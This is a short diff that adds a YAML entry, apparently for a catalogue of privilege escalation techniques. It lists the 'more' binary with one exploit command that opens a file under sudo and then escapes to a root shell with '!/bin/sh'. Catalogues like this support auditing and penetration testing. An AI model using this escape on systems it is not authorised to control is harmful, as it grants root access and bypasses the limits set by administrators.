@@ -1,0 +1,4 @@
+name: more
+binary_path: /usr/bin/more
+exploit_cmds:
+- sudo /usr/bin/more /etc/hosts && !/bin/sh
